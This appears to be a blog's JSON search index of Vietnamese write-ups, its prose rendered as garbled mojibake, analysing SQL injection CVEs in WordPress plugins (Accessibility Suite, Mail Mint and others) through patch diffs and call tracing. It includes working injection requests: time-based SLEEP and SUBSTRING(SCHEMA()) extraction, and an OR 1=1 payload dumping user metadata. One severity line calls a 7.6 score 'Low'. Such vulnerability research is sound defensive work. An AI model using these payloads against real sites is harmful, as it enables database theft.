so√°t k·ªπ input t·ª´ ng∆∞·ªùi d√πng. Lu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress MyStyle Custom Product Designer Plugin \u0026lt;= 3.21.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-09-cve-2025-48281/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eMyStyle Custom Product Designer\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e3.21.2\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-48281\"\u003eCVE-2025-48281\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/mystyle-custom-product-designer\"\u003eWordPress MyStyle Custom Product Designer Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 3.21.1\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e:  High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMyStyle Custom Product Designer\u003c/strong\u003e:  v3.21.1(vul) v√† v3.21.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eActived WooCommerce plugin\u003c/strong\u003e: plugin b·∫Øt bu·ªôc \u003cstrong\u003eactived\u003c/strong\u003e tr∆∞·ªõc khi c√†i \u003cstrong\u003eMyStyle Custom Product Designer Plugin\u003c/strong\u003e, m·ªôt s·ªë h√†m trong \u003cstrong\u003eWooCommerce\u003c/strong\u003e s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003eGET\u003c/strong\u003e request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-48281"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Accessibility Suite c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 4.19. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-32650 Product: WordPress Accessibility Suite Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 4.18 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Accessibility Suite: v4.18(vul) v√† v4.19(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ch∆∞a th·ª±c hi·ªán √©p ki·ªÉu cho input v√† m·∫∑c d√π c√≥ s·ª≠ d·ª•ng prepare() ƒë·ªÉ ch·ªëng SQLi, nh∆∞ng do tri·ªÉn khai kh√¥ng ƒë√∫ng n√™n l·ªó h·ªïng SQLi v·∫´n t·ªìn t·∫°i.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/classes/Helper.php\nstatic function save_false_positive($scan_id, $issue_id){ // other logic if(! is_admin()) { return \u0026#39;\u0026#39;; } // other logic $list = json_decode( $wpdb-\u0026gt;get_results($wpdb-\u0026gt;prepare(\u0026#34;SELECT list FROM $table_name WHERE scan_id = $scan_id\u0026#34;))[0]-\u0026gt;list // phpcs:ignore ); } {: file=\u0026ldquo;includes/classes/Helper.php v4.18\u0026rdquo; }\nB·∫£n v√° ƒë√£ truy·ªÅn $scan_id nh∆∞ tham s·ªë v√†o c√¢u query. SQL injection ƒë∆∞·ª£c ph√≤ng ng·ª´a v√¨ bi·∫øn kh√¥ng ƒë∆∞·ª£c n·ªëi tr·ª±c ti·∫øp v√†o query n·ªØa.\nstatic function save_false_positive($scan_id, $issue_id){ // other logic if(! is_admin()) { return \u0026#39;\u0026#39;; } // other logic $scan_id = absint($scan_id); // Ensure scan_id is a positive integer if (!$scan_id) { return [\u0026#34;status\u0026#34; =\u0026gt; \u0026#34;failed\u0026#34;, \u0026#34;msg\u0026#34; =\u0026gt; \u0026#34;Invalid scan ID\u0026#34;]; } // Get list using properly prepared query $query = $wpdb-\u0026gt;prepare( \u0026#34;SELECT list FROM %i WHERE scan_id = %d\u0026#34;, $table_name, $scan_id ); $result = $wpdb-\u0026gt;get_results($query); } {: file=\u0026ldquo;includes/classes/Helper.php v4.19\u0026rdquo; }\nHow it work? L·ªó h·ªïng n·∫±m trong h√†m tƒ©nh save_false_positive c·ªßa class Helper thu·ªôc file includes/classes/Helper.php. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª± kh√≥a save_false_positive trong th∆∞ m·ª•c ch·ª©a plugin.\nüëâ save_false_positive ƒë∆∞·ª£c callback c·ªßa action hook wp_ajax_ONLINE_ADAv4/save_false_positive g·ªçi.\nKhi POST request ƒë∆∞·ª£c g·ª≠i ƒë·∫øn /wp-admin/admin-ajax.php v·ªõi action=ONLINE_ADAv4/save_false_positive callback ƒë∆∞·ª£c g·ªçi. Trong request c·∫ßn 2 POST param issue_id v√† scan_id. N·∫øu kh√¥ng, ·ª©ng d·ª•ng s·∫Ω tr·∫£ v·ªÅ:\n{\u0026#34;status\u0026#34;:\u0026#34;failed\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;Did not receive the scan ID or the issue ID\u0026#34;} save_false_positive ƒë∆∞·ª£c g·ªçi v·ªõi ƒë·ªëi s·ªë issue_id v√† scan_id. C√°c ƒë·ªëi s·ªë n√†y s·∫Ω b·ªã escape b·ªüi magic quotes trong WordPress v√¨ l·∫•y tr·ª±c ti·∫øp t·ª´ POST request.\n·ª®ng d·ª•ng check xem ng∆∞·ªùi d√πng c√≥ quy·ªÅn truy c·∫≠p v√†o trang admin kh√¥ng. N·∫øu kh√¥ng, tr·∫£ v·ªÅ chu·ªói r·ªóng.\nif(! is_admin()) { return \u0026#39;\u0026#39;; } Sau ƒë√≥ c√°c ƒë·ªëi s·ªë tr·ª±c ti·∫øp truy·ªÅn v√†o c√¢u query ch·ª©a l·ªó h·ªïng SQLi r·ªìi th·ª±c thi.\nExploit Detect SQLi G·ª≠i POST request ch·ª©a payload SQLi. V√¨ ch·ªâ c·∫ßn l√† user c√≥ quy·ªÅn truy c·∫≠p v√†o trang admin, n√™n ta t·∫°o user v·ªõi role:subcriber c√≥ privilege th·∫•p nh·∫•t.\nTrong WordPress, user c√≥ role cao h∆°n s·∫Ω k·∫ø th·ª´a c·∫£ privilege role th·∫•p h∆°n. N√™n ch·ªâ c·∫ßn user subcriber g·ª≠i payload th√†nh c√¥ng th√¨ t·∫•t c·∫£ user c√≤n l·∫°i ƒë·ªÅu c√≥ th·ªÉ. ƒê√∫ng v·ªõi m√¥ t·∫£ c·ªßa CVE\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded; charset=UTF-8 ... Cookie: cookie_here action=ONLINE_ADAv4/save_false_positive\u0026amp;issue_id=1\u0026amp;scan_id=1 UNION SELECT SLEEP(5) Khi ƒë√≥ c√¢u query s·∫Ω tr·ªü th√†nh\nSELECT list FROM wp_oada_false_positives WHERE scan_id = 1 UNION SELECT SLEEP(5) üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; payload ho·∫°t ƒë·ªông.\nC√°c technique c√≥ th·ªÉ s·ª≠ d·ª•ng trong tr∆∞·ªùng h·ª£p table r·ªóng:\nUNION: v√¨ n√≥ kh√¥ng ph·ª• thu·ªôc v√†o d·ªØ li·ªáu b·∫£ng c·ªßa c√¢u query tr∆∞·ªõc ƒë√≥, nh∆∞ng c·∫ßn ph·∫£i t√¨m ƒë∆∞·ª£c s·ªë c·ªôt t∆∞∆°ng ·ª©ng v·ªõi truy v·∫•n tr∆∞·ªõc ƒë√≥. Subquery: Subquery trong m·ªánh ƒë·ªÅ WHERE: MySQL c√≥ th·ªÉ t·ªëi ∆∞u h√≥a v√† b·ªè qua subquery n·∫øu k·∫øt qu·∫£ c√≥ th·ªÉ x√°c ƒë·ªãnh s·ªõm. N·∫øu b·∫£ng kh√¥ng c√≥ d·ªØ li·ªáu, k·∫øt qu·∫£ cu·ªëi c√πng s·∫Ω l√† t·∫≠p r·ªóng, MySQL kh√¥ng c·∫ßn th·ª±c thi SLEEP(). Subquery trong m·ªánh ƒë·ªÅ FROM: Truy v·∫•n con ƒë∆∞·ª£c coi l√† b·∫£ng t·∫°m th·ªùi. MySQL ph·∫£i th·ª±c thi truy v·∫•n con n√†y ƒë·∫ßu ti√™n ƒë·ªÉ t·∫°o b·∫£ng t·∫°m th·ªùi, sau ƒë√≥ m·ªõi th·ª±c thi truy v·∫•n ch√≠nh. Get First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded; charset=UTF-8 ... Cookie: cookie_here action=ONLINE_ADAv4/save_false_positive\u0026amp;issue_id=1\u0026amp;scan_id=1 UNION SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1) S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 0x77(\u0026lsquo;w\u0026rsquo;)\nS·ª≠ d·ª•ng hex encoding w th√†nh 0x77 v√¨ nh∆∞ ph√¢n t√≠ch ·ªü tr√™n, scan_id s·∫Ω b·ªã escape.\nüëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w.\nAutomatic Extraction D·ª±a tr√™n kƒ© thu·∫≠t Timebased SQLi ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript Here\nConclusion L·ªó h·ªïng CVE-2025-32650 trong plugin WordPress Accessibility Suite tr∆∞·ªõc phi√™n b·∫£n 4.19 xu·∫•t ph√°t t·ª´ vi·ªác tri·ªÉn khai kh√¥ng ƒë√∫ng h√†m $wpdb-\u0026gt;prepare() d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ch√≠nh th·ª©c ƒë√£ tri·ªÉn khai ƒë√∫ng $wpdb-\u0026gt;prepare, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n.\nKey takeaways:\nLu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Accessibility Suite Plugin \u0026lt;= 4.18 is vulnerable to SQL Injection ","permalink":"//localhost:1313/vi/posts/2025-09-09-cve-2025-32650/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eAccessibility Suite\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e4.19\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-32650\"\u003eCVE-2025-32650\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/online-accessibility/\"\u003eWordPress Accessibility Suite Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 4.18\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAccessibility Suite\u003c/strong\u003e:  v4.18(vul) v√† v4.19(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ch∆∞a th·ª±c hi·ªán √©p ki·ªÉu cho \u003cstrong\u003einput\u003c/strong\u003e v√† m·∫∑c d√π c√≥ s·ª≠ d·ª•ng \u003ccode\u003eprepare()\u003c/code\u003e ƒë·ªÉ ch·ªëng SQLi, nh∆∞ng do tri·ªÉn khai kh√¥ng ƒë√∫ng n√™n l·ªó h·ªïng SQLi v·∫´n t·ªìn t·∫°i.\u003c/p\u003e","title":"CVE-2025-32650"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Mail Mint c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.18.6. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-58604 Product: WordPress Mail Mint Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.18.5 CVSS severity: Low (7.6) Required Privilege: Administrator Requirements Local WordPress and Debugging Mail Mint: v1.18.5(vul) v√† v1.18.6(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† kh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file /app/Utilities/Helper/Import.php\npublic static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) { // other logic global $wpdb; $total_query = \u0026#34;SELECT COUNT(DISTINCT user_id) as total FROM {$wpdb-\u0026gt;prefix}usermeta WHERE meta_key IN (\u0026#39;\u0026#34; . implode(\u0026#34;\u0026#39;, \u0026#39;\u0026#34;, $keys) . \u0026#34;\u0026#39;)\u0026#34;; $total = $wpdb-\u0026gt;get_var($total_query); //phpcs:ignore // Final query to retrieve user IDs with limit and offset. $final_query = \u0026#34;SELECT user_id FROM {$wpdb-\u0026gt;prefix}usermeta WHERE meta_key IN (\u0026#39;\u0026#34; . implode(\u0026#34;\u0026#39;, \u0026#39;\u0026#34;, $keys) . \u0026#34;\u0026#39;) GROUP BY user_id LIMIT $number OFFSET $offset\u0026#34;; $users = $wpdb-\u0026gt;get_results($final_query, ARRAY_A); //phpcs:ignore // other logic } {: file=\u0026quot;/app/Utilities/Helper/Import.php v1.18.5\u0026quot; }\nB·∫£n v√° s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() thay v√¨ truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query.\npublic static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) { // other logic global $wpdb; // Total query (safe with prepare) $total_query = $wpdb-\u0026gt;prepare( \u0026#34;SELECT COUNT(DISTINCT user_id) as total FROM {$wpdb-\u0026gt;usermeta} WHERE meta_key IN ($placeholders)\u0026#34;, $keys ); $total = $wpdb-\u0026gt;get_var($total_query); //phpcs:ignore // Final query with LIMIT \u0026amp; OFFSET (safe with prepare) $final_query = $wpdb-\u0026gt;prepare( \u0026#34;SELECT user_id FROM {$wpdb-\u0026gt;usermeta} WHERE meta_key IN ($placeholders) GROUP BY user_id LIMIT %d OFFSET %d\u0026#34;, array_merge($keys, array($number, $offset)) ); $users = $wpdb-\u0026gt;get_results($final_query, ARRAY_A); //phpcs:ignore // other logic } {: file=\u0026quot;/app/Utilities/Helper/Import.php v1.18.6\u0026quot; }\nHow it work? L·ªó h·ªïng n·∫±m trong h√†m get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) c·ªßa class Import. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª± kh√≥a get_wp_users_by_learndash_with_limit_offset trong th∆∞ m·ª•c ch·ª©a plugin.\nK·∫øt qu·∫£ cho th·∫•y h√†m n√†y ƒë∆∞·ª£c g·ªçi trong:\nretrieve_contacts_associated_with_learndash() perform_learndash_user_import() thu·ªôc class ContactImportAction trong file /app/API/Actions/Admin/Contact/ContactImportAction.php.\nTi·∫øp theo, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i retrieve_contacts_associated_with_learndash() ƒë∆∞·ª£c s·ª≠ d·ª•ng, ta t√¨m ki·∫øm t·ª´ kh√≥a retrieve_contacts_associated_with_learndash trong th∆∞ m·ª•c plugin.\nH√†m n√†y ƒë∆∞·ª£c g·ªçi trong map_contacts_with_learndash() thu·ªôc class ContactImportController trong file /app/API/Controllers/Admin/Contact/ContactImportController.php.\nTi·∫øp t·ª•c t√¨m ki·∫øm t·ª´ kh√≥a map_contacts_with_learndash ƒë·ªÉ xem h√†m n√†y ƒë∆∞·ª£c ƒëƒÉng k√Ω ·ªü ƒë√¢u:\nTa ph√°t hi·ªán r·∫±ng n√≥ ƒë∆∞·ª£c d√πng l√†m callback c·ªßa REST API th√¥ng qua h√†m register_rest_route() trong WordPress:\nclass ContactImportRoute extends AdminRoute { public function register_routes() { register_rest_route( $this-\u0026gt;namespace, // mrm/v1 $this-\u0026gt;rest_base . \u0026#39;/learndash/map\u0026#39;, // contacts/import/learndash/map/ array( array( \u0026#39;methods\u0026#39; =\u0026gt; WP_REST_Server::CREATABLE, // POST \u0026#39;callback\u0026#39; =\u0026gt; array( $this-\u0026gt;controller, \u0026#39;map_contacts_with_learndash\u0026#39; ), \u0026#39;permission_callback\u0026#39; =\u0026gt; PermissionManager::current_user_can(\u0026#39;mint_manage_contacts\u0026#39;), // Admin \u0026#39;args\u0026#39; =\u0026gt; array( \u0026#39;selectedCourses\u0026#39; =\u0026gt; array( \u0026#39;description\u0026#39; =\u0026gt; __( \u0026#39;The selected courses from which to import contacts.\u0026#39;, \u0026#39;mrm\u0026#39; ), \u0026#39;required\u0026#39; =\u0026gt; true, \u0026#39;type\u0026#39; =\u0026gt; \u0026#39;array\u0026#39;, \u0026#39;sanitize_callback\u0026#39; =\u0026gt; \u0026#39;rest_sanitize_array\u0026#39;, ) ), // array + required ), ) ); // other logic } // other logic } Lu·ªìng g·ªçi h√†m:\nPOST /wp-json/mrm/v1/contacts/import/learndash/map ƒë∆∞·ª£c g·ª≠i t·ªõi REST API c√πng tham s·ªë b·∫Øt bu·ªôc selectedCourses. map_contacts_with_learndash(WP_REST_Request $request) l√† callback ƒë∆∞·ª£c g·ªçi: Nh·∫≠n $request l√†m tham s·ªë ƒë·∫ßu v√†o. L·∫•y c√°c tham s·ªë c·ªßa $request chuy·ªÉn th√†nh m·∫£ng $params Callback g·ªçi retrieve_contacts_associated_with_learndash() v·ªõi ƒë·ªëi s·ªë l√† $params. retrieve_contacts_associated_with_learndash() g·ªçi get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0): $courses = $params['selectedCourses'], $number = 5 $keys l√† m·ªôt m·∫£ng ƒë∆∞·ª£c t·∫°o ra b·∫±ng c√°ch l·∫•y t·∫•t c·∫£ gi√° tr·ªã value trong $courses, sau ƒë√≥ gh√©p chu·ªói theo m·∫´u course_{COURSE_ID}_access_from Tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u query, m·∫£ng $keys ƒë∆∞·ª£c n·ªëi th√†nh m·ªôt chu·ªói b·∫±ng h√†m implode(). N·∫øu $keys ch·ªâ c√≥ m·ªôt ph·∫ßn t·ª≠, k·∫øt qu·∫£ c·ªßa implode() ch√≠nh l√† gi√° tr·ªã chu·ªói c·ªßa ph·∫ßn t·ª≠ ƒë√≥. Th·ª±c thi query, tr·∫£ v·ªÅ JSON ch·ª©a formatted_users + total_users Exploit Sau khi ph√¢n t√≠ch, ta th·∫•y tham s·ªë selectedCourses ƒë∆∞·ª£c x·ª≠ l√Ω qua nhi·ªÅu logic tr∆∞·ªõc khi truy·ªÅn v√†o query ch·ª©a SQLi, quan tr·ªçng ta v·∫´n ki·ªÉm so√°t ƒë∆∞·ª£c gi√° tr·ªã c·ªßa key value.\nPOST request qua BurpSuite:\nTa g·ª≠i request v·ªõi m·ªôt key duy nh·∫•t =\u0026gt; d·ªÖ d√†ng ki·ªÉm so√°t c√¢u query\nKhi ƒë√≥, c√¢u query tr·ªü th√†nh\nSELECT user_id FROM wp_usermeta WHERE meta_key IN (\u0026#39;course_abc\u0026#39;) OR 1=1 -- _access_from\u0026#39;) GROUP BY user_id LIMIT 5 OFFSET 0 ') tho√°t kh·ªèi IN 1=1 lu√¥n ƒë√∫ng =\u0026gt; tr·∫£ v·ªÅ t√¢t c·∫£ user_id trong wp_usermeta ƒêo·∫°n code c√≤n l·∫°i trong get_wp_users_by_learndash_with_limit_offset s·∫Ω truy v·∫•n meta th√¥ng tin c·ªßa t·∫•t c·∫£ user tr·∫£ v·ªÅ:\n$formatted_users = array_map( function ($user) { $user-\u0026gt;usermeta = array_map( function ($user_data) { return reset($user_data); }, get_user_meta($user-\u0026gt;ID) ); return $user; }, $contacts ); Conclusion L·ªó h·ªïng CVE-2025-58604 trong plugin WordPress Mail Mint tr∆∞·ªõc phi√™n b·∫£n 1.18.6 xu·∫•t ph√°t t·ª´ vi·ªác kh√¥ng s·ª≠ d·ª•ng c∆° ch·∫ø chu·∫©n b·ªã truy v·∫•n ($wpdb-\u0026gt;prepare) m√† truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u l·ªánh SQL d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ch√≠nh th·ª©c ƒë√£ thay th·∫ø vi·ªác n·ªëi chu·ªói b·∫±ng c√°ch d√πng $wpdb-\u0026gt;prepare, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n.\nKey takeaways:\nLu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Mail Mint Plugin \u0026lt;= 1.18.5 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-04-cve-2025-58604/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eMail Mint\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.18.6\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-58604\"\u003eCVE-2025-58604\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/mail-mint/\"\u003eWordPress Mail Mint Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.18.5\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: Low (7.6)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: 